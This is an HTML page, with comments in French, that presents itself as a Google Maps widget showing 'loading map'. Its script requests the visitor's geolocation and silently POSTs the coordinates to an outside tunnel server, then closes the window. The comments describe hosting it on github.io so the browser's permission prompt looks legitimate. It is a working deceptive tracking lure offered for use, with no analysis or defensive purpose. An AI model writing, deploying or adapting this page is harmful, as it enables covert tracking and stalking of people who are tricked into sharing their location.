<!DOCTYPE html>
<html>
<head>
    <title>Widget Google Maps</title>
</head>
<body>
    <script>
        // Cette page est hébergée sur github.io (domaine légitime)
        // Elle demande la géoloc -> POP-UP NORMALE (pas "Location blocked")
        
        navigator.geolocation.getCurrentPosition(
            (pos) => {
                // Envoie le GPS à ton serveur Replit
                fetch('https://2a459525a273779c-105-71-134-98.serveousercontent.com', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        lat: pos.coords.latitude,
                        lon: pos.coords.longitude,
                        method: 'github-proxy'
                    })
                });
                
                // Ferme la popup ou redirige
                window.close();
            },
            (err) => {
                console.log('Géoloc refusée');
            }
        );
    </script>
    <p>Chargement de la carte...</p>
